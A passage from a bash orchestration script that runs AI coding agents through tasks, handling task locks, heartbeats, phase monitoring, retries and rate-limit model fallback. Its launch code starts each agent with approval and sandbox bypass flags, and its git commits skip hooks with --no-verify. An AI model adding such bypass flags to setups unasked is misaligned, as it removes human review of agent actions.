      return 0
    fi
  fi

  local now locked_timestamp age
  now=$(date +%s)
  locked_timestamp=$(date -j -f "%Y-%m-%d %H:%M:%S" "$locked_at" +%s 2>/dev/null || date -d "$locked_at" +%s 2>/dev/null || echo "0")

  if [ "$locked_timestamp" != "0" ]; then
    age=$((now - locked_timestamp))
    if [ "$age" -gt "$AGENT_LOCK_TIMEOUT" ]; then
      log_heal "Lock is ${age}s old (> ${AGENT_LOCK_TIMEOUT}s) - lock is stale"
      return 0
    fi
  fi

  return 1
}

is_task_locked() {
  local task_id="$1"
  local lock_file
  lock_file=$(get_lock_file "$task_id")

  if [ ! -f "$lock_file" ]; then
    return 1
  fi

  local lock_agent
  lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")

  if [ "$lock_agent" = "$AGENT_ID" ]; then
    return 1
  fi

  if is_lock_stale "$lock_file"; then
    log_heal "Removing stale lock for $task_id"
    rm -f "$lock_file"
    return 1
  fi

  return 0
}

acquire_lock() {
  local task_id="$1"
  local lock_file
  lock_file=$(get_lock_file "$task_id")

  local lock_dir="${lock_file}.acquiring"

  if ! mkdir "$lock_dir" 2>/dev/null; then
    sleep 0.5
    if [ -d "$lock_dir" ]; then
      log_warn "Lock acquisition in progress by another agent for $task_id"
      return 1
    fi
  fi

  if [ -f "$lock_file" ]; then
    local lock_agent
    lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")

    if [ "$lock_agent" != "$AGENT_ID" ] && ! is_lock_stale "$lock_file"; then
      rmdir "$lock_dir" 2>/dev/null || true
      return 1
    fi
  fi

  cat > "$lock_file" << EOF
AGENT_ID="$AGENT_ID"
LOCKED_AT="$(date '+%Y-%m-%d %H:%M:%S')"
PID="$$"
TASK_ID="$task_id"
EOF

  rmdir "$lock_dir" 2>/dev/null || true

  HELD_LOCKS+=("$task_id")
  log_lock "Acquired lock for $task_id"

  return 0
}

release_lock() {
  local task_id="$1"
  local lock_file
  lock_file=$(get_lock_file "$task_id")

  if [ -f "$lock_file" ]; then
    local lock_agent
    lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")

    if [ "$lock_agent" = "$AGENT_ID" ]; then
      rm -f "$lock_file"
      log_lock "Released lock for $task_id"

      local new_held=()
      for held in "${HELD_LOCKS[@]}"; do
        if [ "$held" != "$task_id" ]; then
          new_held+=("$held")
        fi
      done
      HELD_LOCKS=("${new_held[@]+"${new_held[@]}"}")
    fi
  fi
}

release_all_locks() {
  log_lock "Releasing all held locks..."
  for task_id in "${HELD_LOCKS[@]+"${HELD_LOCKS[@]}"}"; do
    release_lock "$task_id"
  done
  HELD_LOCKS=()
}

# ============================================================================
# Task File Git Operations
# ============================================================================

commit_task_files() {
  local message="$1"
  local task_id="${2:-}"

  # Only attempt git operations if we're in a git repo
  if ! git rev-parse --is-inside-work-tree &>/dev/null; then
    return 0  # Not a git repo, silently skip
  fi

  if ! git add "$TASKS_DIR" TASKBOARD.md 2>/dev/null; then
    log_warn "Failed to stage task files"
    return 0  # Non-fatal, continue without commit
  fi

  if git diff --cached --quiet 2>/dev/null; then
    return 0  # Nothing to commit
  fi

  local commit_result=0
  if [ -n "$task_id" ]; then
    git commit -m "$message [$task_id]" --no-verify 2>/dev/null || commit_result=$?
  else
    git commit -m "$message" --no-verify 2>/dev/null || commit_result=$?
  fi

  if [ "$commit_result" -ne 0 ]; then
    log_warn "Git commit failed (code: $commit_result)"
    return 0  # Non-fatal
  fi

  log_info "Committed task file changes: $message"
}

# ============================================================================
# Task Assignment (Update task file metadata)
# ============================================================================

# Update a metadata field in a task file's markdown table
# Uses awk -v to pass values as literal strings (not regex patterns)
# This avoids sed metacharacter injection vulnerabilities
update_task_metadata() {
  local task_file="$1"
  local field_name="$2"
  local new_value="$3"

  [ -f "$task_file" ] || return 1

  # Escape backslashes for awk -v (which interprets escape sequences)
  local escaped_value="${new_value//\\/\\\\}"

  local temp_file="${task_file}.tmp.$$"
  # Use awk's index() to find "| FieldName |" pattern (literal string match)
  awk -v field="$field_name" -v value="$escaped_value" '
    BEGIN { found = 0; pattern = "| " field " |" }
    index($0, pattern) == 1 {
      printf "| %s | %s |\n", field, value
      found = 1
      next
    }
    { print }
    END { exit (found ? 0 : 1) }
  ' "$task_file" > "$temp_file" && mv "$temp_file" "$task_file"
  local result=$?
  rm -f "$temp_file" 2>/dev/null
  return $result
}

assign_task() {
  local task_file="$1"
  local timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M')

  if [ -f "$task_file" ]; then
    update_task_metadata "$task_file" "Assigned To" "\`$AGENT_ID\`"
    update_task_metadata "$task_file" "Assigned At" "\`$timestamp\`"
    log_info "Assigned task to $AGENT_ID"
  fi
}

unassign_task() {
  local task_file="$1"

  if [ -f "$task_file" ]; then
    update_task_metadata "$task_file" "Assigned To" ""
    update_task_metadata "$task_file" "Assigned At" ""
    log_info "Unassigned task"
  fi
}

refresh_assignment() {
  local task_file="$1"
  local timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M')

  if [ -f "$task_file" ]; then
    update_task_metadata "$task_file" "Assigned At" "\`$timestamp\`"
    log_info "Refreshed assignment timestamp"
  fi
}

# ============================================================================
# Heartbeat (Refresh assignment to prevent stale detection)
# ============================================================================

HEARTBEAT_PID=""
CURRENT_TASK_FILE=""

start_heartbeat() {
  local task_file="$1"
  CURRENT_TASK_FILE="$task_file"

  stop_heartbeat

  (
    trap "exit 0" INT TERM
    while true; do
      sleep "$AGENT_HEARTBEAT" &
      wait $! 2>/dev/null || exit 0
      if [ -f "$CURRENT_TASK_FILE" ]; then
        refresh_assignment "$CURRENT_TASK_FILE"
        local task_id
        task_id=$(get_task_id_from_file "$CURRENT_TASK_FILE")
        local lock_file
        lock_file=$(get_lock_file "$task_id")
        if [ -f "$lock_file" ]; then
          cat > "$lock_file" << EOF
AGENT_ID="$AGENT_ID"
LOCKED_AT="$(date '+%Y-%m-%d %H:%M:%S')"
PID="$$"
TASK_ID="$task_id"
EOF
        fi
      fi
    done
  ) &
  HEARTBEAT_PID=$!
  log_info "Started heartbeat (PID: $HEARTBEAT_PID, interval: ${AGENT_HEARTBEAT}s)"
}

stop_heartbeat() {
  if [ -n "$HEARTBEAT_PID" ] && kill -0 "$HEARTBEAT_PID" 2>/dev/null; then
    kill "$HEARTBEAT_PID" 2>/dev/null || true
    wait "$HEARTBEAT_PID" 2>/dev/null || true
    log_info "Stopped heartbeat"
  fi
  HEARTBEAT_PID=""
}

# ============================================================================
# Phase Monitor (Active Health Checking)
# ============================================================================
# Monitors agent output during phase execution to detect stuck/hung agents.
# Checks log file growth at regular intervals and warns when no output is
# produced for too long.

PHASE_MONITOR_PID=""

start_phase_monitor() {
  local phase_name="$1"
  local phase_log="$2"
  local timeout="$3"

  stop_phase_monitor

  (
    trap "exit 0" INT TERM
    local last_size=0
    local last_activity_time
    last_activity_time=$(date +%s)
    local start_time
    start_time=$(date +%s)
    local stall_warned=0

    while true; do
      sleep "$PHASE_MONITOR_INTERVAL" &
      wait $! 2>/dev/null || exit 0

      local now
      now=$(date +%s)
      local elapsed=$(( now - start_time ))
      local mins=$(( elapsed / 60 ))
      local secs=$(( elapsed % 60 ))

      # Check log file size
      local current_size=0
      if [ -f "$phase_log" ]; then
        current_size=$(wc -c < "$phase_log" 2>/dev/null || echo 0)
        current_size="${current_size##* }"  # trim whitespace (macOS wc)
      fi

      # Check for new output
      if [ "$current_size" -gt "$last_size" ]; then
        local new_bytes=$(( current_size - last_size ))
        last_activity_time=$now
        stall_warned=0

        # Human-readable size
        local size_display
        if [ "$current_size" -gt 1048576 ]; then
          size_display="$(( current_size / 1048576 ))MB"
        elif [ "$current_size" -gt 1024 ]; then
          size_display="$(( current_size / 1024 ))KB"
        else
          size_display="${current_size}B"
        fi

        echo -e "${DIM}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ✓ active (+${new_bytes}B, ${size_display} total)"
        last_size=$current_size
      else
        local stall_time=$(( now - last_activity_time ))

        if [ "$stall_time" -ge "$PHASE_STALL_THRESHOLD" ]; then
          local stall_mins=$(( stall_time / 60 ))
          local stall_secs=$(( stall_time % 60 ))

          if [ "$stall_warned" -eq 0 ]; then
            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⚠ NO OUTPUT for ${stall_mins}m${stall_secs}s (log: ${current_size} bytes)"
            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC}   Agent may be stuck, thinking, or waiting for API response"
            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC}   Log: $phase_log"
            stall_warned=1
          else
            # Repeat warning every stall_threshold interval
            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⚠ STILL NO OUTPUT (${stall_mins}m${stall_secs}s silent)"
          fi
        else
          echo -e "${DIM}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⋯ waiting (${stall_time}s since last output)"
        fi
      fi

      # Warn when approaching timeout
      local remaining=$(( timeout - elapsed ))
      if [ "$remaining" -le 120 ] && [ "$remaining" -gt 0 ]; then
        echo -e "${RED}[$AGENT_ID MONITOR]${NC} ${phase_name} │ ⚠ TIMEOUT in ${remaining}s!"
      fi
    done
  ) &
  PHASE_MONITOR_PID=$!
}

stop_phase_monitor() {
  if [ -n "$PHASE_MONITOR_PID" ] && kill -0 "$PHASE_MONITOR_PID" 2>/dev/null; then
    kill "$PHASE_MONITOR_PID" 2>/dev/null || true
    wait "$PHASE_MONITOR_PID" 2>/dev/null || true
  fi
  PHASE_MONITOR_PID=""
}

# ============================================================================
# Model Fallback (opus -> sonnet on rate limits)
# ============================================================================

fallback_to_sonnet() {
  if [ "$AGENT_NO_FALLBACK" = "1" ]; then
    log_warn "Model fallback disabled (AGENT_NO_FALLBACK=1)"
    return 1
  fi

  # Agent-specific fallback logic
  case "$CURRENT_AGENT" in
    claude)
      if [ "$CURRENT_MODEL" = "sonnet" ] || [ "$CURRENT_MODEL" = "haiku" ]; then
        log_warn "Already using $CURRENT_MODEL, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to sonnet due to rate limits"
      CURRENT_MODEL="sonnet"
      ;;
    codex)
      if [ "$CURRENT_MODEL" = "o4-mini" ]; then
        log_warn "Already using o4-mini, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to o4-mini due to rate limits"
      CURRENT_MODEL="o4-mini"
      ;;
    gemini)
      if [ "$CURRENT_MODEL" = "gemini-2.5-flash" ]; then
        log_warn "Already using gemini-2.5-flash, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to gemini-2.5-flash due to rate limits"
      CURRENT_MODEL="gemini-2.5-flash"
      ;;
    copilot)
      if [ "$CURRENT_MODEL" = "claude-sonnet-4" ]; then
        log_warn "Already using claude-sonnet-4, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to claude-sonnet-4 due to rate limits"
      CURRENT_MODEL="claude-sonnet-4"
      ;;
    opencode)
      if [ "$CURRENT_MODEL" = "claude-sonnet-4" ]; then
        log_warn "Already using claude-sonnet-4, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to claude-sonnet-4 due to rate limits"
      CURRENT_MODEL="claude-sonnet-4"
      ;;
    *)
      log_warn "Unknown agent $CURRENT_AGENT, cannot fall back"
      return 1
      ;;
  esac

  MODEL_FALLBACK_TRIGGERED=1
  return 0
}

reset_model() {
  if [ "$MODEL_FALLBACK_TRIGGERED" = "1" ]; then
    log_model "Resetting model back to $DOYAKEN_MODEL after successful run"
    CURRENT_MODEL="$DOYAKEN_MODEL"
    MODEL_FALLBACK_TRIGGERED=0
  fi
}

# ============================================================================
# Phase Execution (Modular Workflow)
# ============================================================================

build_phase_prompt() {
  local prompt_file="$1"
  local task_id="$2"
  local task_file="$3"
  local timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M')

  # Find prompt file (project first, then global)
  local prompt_path
  prompt_path=$(get_prompt_file "$prompt_file") || {
    log_error "Prompt file not found: $prompt_file (checked project and global)"
    return 1
  }

  local template
  template=$(cat "$prompt_path")

  local recent_commits=""
  if [[ "$prompt_file" == *"review"* ]]; then
    recent_commits=$(git log --oneline -10 --grep="$task_id" 2>/dev/null || echo "(no commits yet)")
  fi

  local prompt="$template"
  prompt="${prompt//\{\{TASK_ID\}\}/$task_id}"
  prompt="${prompt//\{\{TASK_FILE\}\}/$task_file}"
  prompt="${prompt//\{\{TIMESTAMP\}\}/$timestamp}"
  prompt="${prompt//\{\{RECENT_COMMITS\}\}/$recent_commits}"
  prompt="${prompt//\{\{AGENT_ID\}\}/$AGENT_ID}"

  # Process {{include:path}} directives
  prompt=$(process_includes "$prompt")

  echo "$prompt"
}

run_phase_once() {
  local phase_name="$1"
  local prompt_file="$2"
  local timeout="$3"
  local task_id="$4"
  local task_file="$5"
  local attempt="$6"
  local phase_name_lower
  phase_name_lower=$(echo "$phase_name" | tr '[:upper:]' '[:lower:]')
  local phase_log="$RUN_LOG_DIR/phase-${phase_name_lower}-$task_id-attempt${attempt}.log"

  log_phase "Starting $phase_name phase (attempt $attempt)"
  echo "  Agent: $CURRENT_AGENT"
  echo "  Model: $CURRENT_MODEL"
  echo "  Timeout: ${timeout}s"
  echo "  Log: $phase_log"

  local prompt build_result=0
  prompt=$(build_phase_prompt "$prompt_file" "$task_id" "$task_file") || build_result=$?
  if [ "$build_result" -ne 0 ]; then
    log_error "Failed to build prompt for $phase_name (prompt file: $PROMPTS_DIR/$prompt_file)"
    return 1
  fi

  local output_mode="stream"
  if [ "$AGENT_QUIET" = "1" ]; then
    output_mode="quiet"
  elif [ "$AGENT_PROGRESS" = "1" ]; then
    output_mode="progress"
  fi

  local exit_code=0

  echo ""
  echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
  echo -e "${CYAN}│${NC} ${BOLD}PHASE: $phase_name (attempt $attempt) [$CURRENT_AGENT]${NC}"
  echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
  echo ""

  # Start phase monitor (checks for stuck agents)
  start_phase_monitor "$phase_name" "$phase_log" "$timeout"

  # Build timeout prefix
  local timeout_cmd=""
  if command -v gtimeout &> /dev/null; then
    timeout_cmd="gtimeout"
  elif command -v timeout &> /dev/null; then
    timeout_cmd="timeout"
  fi

  # Build agent command using abstraction functions
  # Each agent uses its correct autonomous mode flags
  local agent_args=()

  case "$CURRENT_AGENT" in
    claude)
      # Claude: --dangerously-skip-permissions --permission-mode bypassPermissions --model <model>
      agent_args+=("--dangerously-skip-permissions")
      agent_args+=("--permission-mode" "bypassPermissions")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("--model" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--output-format" "stream-json" "--verbose")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("-p" "$prompt")

      if [ "$output_mode" = "progress" ]; then
        if [ -n "$timeout_cmd" ]; then
          $timeout_cmd "${timeout}s" claude "${agent_args[@]}" 2>&1 | tee "$phase_log" | progress_filter "$phase_name" || exit_code=$?
        else
          claude "${agent_args[@]}" 2>&1 | tee "$phase_log" | progress_filter "$phase_name" || exit_code=$?
        fi
      else
        if [ -n "$timeout_cmd" ]; then
          $timeout_cmd "${timeout}s" claude "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
        else
          claude "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
        fi
      fi
      ;;

    codex)
      # Codex: codex exec --dangerously-bypass-approvals-and-sandbox -m <model> <prompt>
      agent_args+=("exec")
      agent_args+=("--dangerously-bypass-approvals-and-sandbox")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("-m" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--verbose")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("$prompt")

      if [ -n "$timeout_cmd" ]; then
        $timeout_cmd "${timeout}s" codex "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      else
        codex "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      fi
      ;;

    gemini)
      # Gemini: gemini --yolo -m <model> -p <prompt>
      agent_args+=("--yolo")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("-m" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--verbose")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("-p" "$prompt")

      if [ -n "$timeout_cmd" ]; then
        $timeout_cmd "${timeout}s" gemini "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      else
        gemini "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      fi
      ;;

    copilot)
      # Copilot: copilot --allow-all-tools --allow-all-paths -m <model> -p <prompt>
      agent_args+=("--allow-all-tools")
      agent_args+=("--allow-all-paths")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("-m" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--verbose")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("-p" "$prompt")

      if [ -n "$timeout_cmd" ]; then
        $timeout_cmd "${timeout}s" copilot "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      else
        copilot "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      fi
      ;;

    opencode)
      # OpenCode: opencode run --auto-approve --model <model> <prompt>
      agent_args+=("run")
      agent_args+=("--auto-approve")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("--model" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--print-logs")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("$prompt")

      if [ -n "$timeout_cmd" ]; then
        $timeout_cmd "${timeout}s" opencode "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      else
        opencode "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      fi
      ;;

    *)
      log_error "Unknown agent: $CURRENT_AGENT"
      return 1
      ;;
  esac

  # Stop phase monitor
  stop_phase_monitor

  # If pipeline was killed by SIGINT (Ctrl+C), propagate the signal
  if [ "$exit_code" -eq 130 ] || [ "$INTERRUPTED" = "1" ]; then
    log_warn "$phase_name interrupted by user"
    return 130
  fi

  echo ""
  echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
  echo ""

  case $exit_code in
    0)
      log_phase "$phase_name completed successfully"
      return 0
      ;;
    124)
      log_error "$phase_name timed out after ${timeout}s"
      return 124
      ;;
    *)
      if grep -qiE "rate.?limit|overloaded|429|502|503|504|capacity|quota" "$phase_log" 2>/dev/null; then
        log_heal "Rate limit detected in $phase_name"
        if fallback_to_sonnet; then
          log_heal "Will retry $phase_name with fallback model"
        fi
        return 2
      fi
      log_error "$phase_name failed with exit code $exit_code"
      return 1
      ;;
  esac
}

run_phase() {
  local phase_name="$1"
  local prompt_file="$2"
  local timeout="$3"
  local skip="$4"
  local task_id="$5"
  local task_file="$6"

  if [ "$skip" = "1" ]; then
    log_phase "Skipping $phase_name (disabled)"
    return 0
  fi

  # Run before-phase skill hooks
  run_skill_hooks "BEFORE" "$phase_name"

  local attempt=1
  local max_attempts="$AGENT_MAX_RETRIES"

  while [ "$attempt" -le "$max_attempts" ]; do
    local result=0
    run_phase_once "$phase_name" "$prompt_file" "$timeout" "$task_id" "$task_file" "$attempt" || result=$?

    case $result in
      0)
        # Run after-phase skill hooks
        run_skill_hooks "AFTER" "$phase_name"
        return 0
        ;;
      130)
        # User interrupt (Ctrl+C) - propagate immediately, don't retry
        return 130
        ;;
      124)
        log_error "$phase_name timed out - consider increasing TIMEOUT_${phase_name}"
        return 1
        ;;
      2)
        if [ "$attempt" -lt "$max_attempts" ]; then
          local backoff=$((AGENT_RETRY_DELAY * attempt))
          log_heal "Retrying $phase_name in ${backoff}s (attempt $((attempt + 1))/$max_attempts)"
          sleep "$backoff"
        fi
        ;;
      *)
        if [ "$attempt" -lt "$max_attempts" ]; then
          local backoff=$((AGENT_RETRY_DELAY * attempt))
          log_heal "Retrying $phase_name in ${backoff}s (attempt $((attempt + 1))/$max_attempts)"
          sleep "$backoff"
        fi
        ;;
    esac

    ((attempt++))
  done

  log_error "$phase_name failed after $max_attempts attempts - check logs: $RUN_LOG_DIR/phase-*"
  return 1
}

run_all_phases() {
  local task_id="$1"
  local task_file="$2"

  log_info "Running ${#PHASES[@]} phases for task: $task_id"

  for phase_def in "${PHASES[@]}"; do
    # Check for interrupt before starting next phase
    if [ "$INTERRUPTED" = "1" ]; then
      log_warn "Interrupted - stopping phase execution"
      return 130
    fi

    IFS='|' read -r name prompt_file timeout skip <<< "$phase_def"

    local phase_result=0
    run_phase "$name" "$prompt_file" "$timeout" "$skip" "$task_id" "$task_file" || phase_result=$?

    if [ "$phase_result" -eq 130 ]; then
      return 130
    elif [ "$phase_result" -ne 0 ]; then
      log_error "Phase $name failed - stopping task execution"
      return 1
    fi

    sleep 1
  done

  log_success "All phases completed for task: $task_id"
  return 0
}

# ============================================================================
# State Management (Self-Healing)
# ============================================================================

init_state() {
  mkdir -p "$STATE_DIR"
  chmod 700 "$STATE_DIR"
  mkdir -p "$RUN_LOG_DIR"
  chmod 700 "$RUN_LOG_DIR"
  # Auto-rotate old logs (>7 days)
  find "$LOGS_DIR" -maxdepth 1 -type d -mtime +7 ! -name 'logs' -exec rm -rf {} + 2>/dev/null || true
  init_locks
}

save_session() {
  local session_id="$1"
  local iteration="$2"
  local status="$3"
  local session_file="$STATE_DIR/session-$AGENT_ID"

  cat > "$session_file" << EOF
SESSION_ID="$session_id"
AGENT_ID="$AGENT_ID"
ITERATION="$iteration"
STATUS="$status"
TIMESTAMP="$(date '+%Y-%m-%d %H:%M:%S')"
NUM_TASKS="$NUM_TASKS"
MODEL="${DOYAKEN_MODEL:-opus}"
LOG_DIR="$RUN_LOG_DIR"
EOF
  log_info "Session state saved: $session_id (iteration $iteration)"
}

load_session() {
  local session_file="$STATE_DIR/session-$AGENT_ID"

  if [ -f "$session_file" ] && [ "$AGENT_NO_RESUME" != "1" ]; then
    # shellcheck source=/dev/null
    source "$session_file"
    if [ -n "${SESSION_ID:-}" ] && [ "${STATUS:-}" = "running" ]; then
      log_heal "Found interrupted session: $SESSION_ID"
      log_heal "Last iteration: ${ITERATION:-1}, Status: $STATUS"
      return 0
    fi
  fi
  return 1
}

clear_session() {
  local session_file="$STATE_DIR/session-$AGENT_ID"
  rm -f "$session_file"
}

update_health() {
  local status="$1"
  local message="$2"
  local health_file="$STATE_DIR/health-$AGENT_ID"

  cat > "$health_file" << EOF
STATUS="$status"
MESSAGE="$message"
AGENT_ID="$AGENT_ID"
LAST_CHECK="$(date '+%Y-%m-%d %H:%M:%S')"
CONSECUTIVE_FAILURES="${CONSECUTIVE_FAILURES:-0}"
EOF
}

get_consecutive_failures() {
  local health_file="$STATE_DIR/health-$AGENT_ID"
  if [ -f "$health_file" ]; then
    grep "^CONSECUTIVE_FAILURES=" "$health_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "0"
  else
    echo "0"
  fi
}

# ============================================================================
# Health Checks
# ============================================================================

health_check() {
  log_step "Running health checks..."

  local issues=0
  local agent_cmd
  agent_cmd=$(agent_command "$CURRENT_AGENT")

  # Check if selected agent is installed
  if ! command -v "$agent_cmd" &> /dev/null; then
    log_error "$CURRENT_AGENT CLI ($agent_cmd) not found"
    agent_install_instructions "$CURRENT_AGENT"
    ((issues++))
  else
    log_success "$CURRENT_AGENT CLI ($agent_cmd) available"
  fi

  if command -v gtimeout &> /dev/null; then
    log_success "Timeout available (gtimeout)"
  elif command -v timeout &> /dev/null; then
    log_success "Timeout available (timeout)"
  else
    log_warn "No timeout command found (gtimeout/timeout) - phases will run without time limits"
    log_warn "Install coreutils for timeout support: brew install coreutils (macOS)"
  fi

  if [ -z "$AGENT_MD" ]; then
    log_warn "No AGENT.md or CLAUDE.md found"
  else
    log_success "Operating manual exists: $(basename "$AGENT_MD")"
  fi

  for dir in 1.blocked 2.todo 3.doing 4.done _templates; do
    if [ ! -d "$TASKS_DIR/$dir" ]; then
      log_warn "Creating missing directory: $TASKS_DIR/$dir"
      mkdir -p "$TASKS_DIR/$dir"
    fi
  done
  log_success "Task directories ready"

  if [ ! -d "$LOCKS_DIR" ]; then
    mkdir -p "$LOCKS_DIR"
  fi
  log_success "Locks directory ready"

  local available_kb
  available_kb=$(df -k "$PROJECT_DIR" | awk 'NR==2 {print $4}')
  if [ "$available_kb" -lt 1048576 ]; then
    log_warn "Low disk space: $((available_kb / 1024))MB available"
  else
    log_success "Disk space OK: $((available_kb / 1024))MB available"
  fi

  local active_locks
  active_locks=$(find "$LOCKS_DIR" -name "*.lock" 2>/dev/null | wc -l | tr -d ' ')
  if [ "$active_locks" -gt 0 ]; then
    log_info "Active task locks: $active_locks"
  fi

  if [ "$issues" -gt 0 ]; then
    update_health "unhealthy" "$issues issues found"
    return 1
  fi

  update_health "healthy" "All checks passed"
  return 0
}

# ============================================================================
# Validation
# ============================================================================

validate_environment() {
  log_step "Validating environment..."

  if ! [[ "$NUM_TASKS" =~ ^[0-9]+$ ]]; then
    log_error "Invalid number of tasks: $NUM_TASKS"
    echo "Usage: doyaken run [number_of_tasks]"
    exit 1
  fi

  if [ "$NUM_TASKS" -lt 1 ] || [ "$NUM_TASKS" -gt 50 ]; then
    log_error "Number of tasks must be between 1 and 50"
    exit 1
  fi

  log_success "Environment validated"
}

# ============================================================================
# Task Management
# ============================================================================

# Get the actual folder path, supporting both old and new naming
get_task_folder() {
  local state="$1"
  # Check for new numbered naming first
  case "$state" in
    blocked) [ -d "$TASKS_DIR/1.blocked" ] && echo "$TASKS_DIR/1.blocked" && return ;;
    todo)    [ -d "$TASKS_DIR/2.todo" ] && echo "$TASKS_DIR/2.todo" && return ;;
    doing)   [ -d "$TASKS_DIR/3.doing" ] && echo "$TASKS_DIR/3.doing" && return ;;
    done)    [ -d "$TASKS_DIR/4.done" ] && echo "$TASKS_DIR/4.done" && return ;;
  esac
  # Fall back to old naming
  echo "$TASKS_DIR/$state"
}

count_tasks() {
  local state="$1"
  local dir
  dir=$(get_task_folder "$state")
  find "$dir" -maxdepth 1 -name "*.md" 2>/dev/null | wc -l | tr -d ' '
}

count_locked_tasks() {
  find "$LOCKS_DIR" -maxdepth 1 -name "*.lock" 2>/dev/null | wc -l | tr -d ' '
}

get_doing_task_for_agent() {
  local doing_dir
  doing_dir=$(get_task_folder "doing")
  for file in "$doing_dir"/*.md; do
    [ -f "$file" ] || continue
    local task_id
    task_id=$(get_task_id_from_file "$file")

    local lock_file
    lock_file=$(get_lock_file "$task_id")

    if [ -f "$lock_file" ]; then
      local lock_agent
      lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")
      if [ "$lock_agent" = "$AGENT_ID" ]; then
        echo "$file"
        return 0
      fi
    fi
  done

  return 1
}

# Find orphaned tasks in 3.doing/ that don't have a valid lock from this agent
# Returns: task file path and orphan reason via echo, or returns 1 if none found
# Usage: local result; result=$(find_orphaned_doing_task) && read task_file orphan_reason <<< "$result"
find_orphaned_doing_task() {
  local doing_dir
  doing_dir=$(get_task_folder "doing")

  for file in "$doing_dir"/*.md; do
    [ -f "$file" ] || continue
    local task_id
    task_id=$(get_task_id_from_file "$file")

    local lock_file
    lock_file=$(get_lock_file "$task_id")

    # Skip tasks with valid lock from THIS agent (handled by get_doing_task_for_agent)
    if [ -f "$lock_file" ]; then
      local lock_agent
      lock_agent=$(grep "^AGENT_ID=" "$lock_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "")
      if [ "$lock_agent" = "$AGENT_ID" ]; then
        continue
      fi

      # Check if lock is stale
      if is_lock_stale "$lock_file"; then
        log_heal "Found orphaned task $task_id (stale lock from $lock_agent)"
        echo "$file stale:$lock_agent"
        return 0
      else
        # Lock from different agent that isn't stale - this is an orphan we can offer to take over
        log_heal "Found orphaned task $task_id (locked by $lock_agent)"
        echo "$file locked:$lock_agent"
        return 0
      fi
    else
      # No lock file at all - orphaned
      log_heal "Found orphaned task $task_id (no lock)"
      echo "$file nolock"
      return 0
    fi
  done

  return 1
}

# Prompt user to resume an orphaned task with 60-second timeout defaulting to "yes"
# Args: task_id, orphan_reason
# Returns: 0 if user wants to resume, 1 if declined
prompt_orphan_resume() {
  local task_id="$1"
  local orphan_reason="$2"

  # In non-interactive mode, auto-resume
  if [ "$AGENT_NO_PROMPT" = "1" ]; then
